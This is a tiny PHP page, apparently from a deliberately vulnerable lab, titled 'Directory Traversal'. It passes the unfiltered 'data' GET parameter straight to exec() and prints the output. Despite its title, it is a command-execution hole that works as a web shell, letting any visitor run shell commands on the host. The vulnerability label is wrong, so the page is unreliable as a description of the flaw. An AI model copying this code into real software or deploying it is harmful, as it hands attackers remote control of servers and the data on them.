<html>
<head>
<title>Directory Traversal </title>
</head>
<body>

<?php
   if(isset($_GET['data']))
  {
           echo "<h2> Director Traversal </h2> <br />";
            $lang=$_GET['data'] ;
  
    
            exec($lang, $execarray);
            foreach($execarray as $value)
                 { 
                        echo $value . "<br />";
             }
 }
?>

</body>
</html>


